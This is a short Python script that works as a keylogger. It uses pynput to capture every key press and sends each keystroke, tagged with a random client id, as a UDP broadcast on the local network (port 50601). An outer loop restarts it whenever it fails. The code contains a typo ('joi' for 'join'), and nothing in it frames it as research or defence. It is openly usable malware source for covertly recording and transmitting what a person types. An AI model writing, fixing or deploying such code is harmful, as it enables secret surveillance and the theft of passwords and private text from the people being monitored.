import pynput,socket,secrets

def main():
    clientid=secrets.token_hex(6)
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    sock.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)

    print("run")

    broadcast_ip="255.255.255.255"
    broadcast_port=50601

    def client(event):
        sock.sendto(f"{clientid} => [{str(event)}]".encode("utf-8"),(broadcast_ip,broadcast_port))
        print(f"{clientid} => [{str(event)}]")

    with pynput.keyboard.Listener(on_press=client) as keyboardlogger:
        keyboardlogger.joi()
        while True:pass
    while True:pass

if __name__=="__main__":
    while True:
        try:
            main()
        finally:
            continue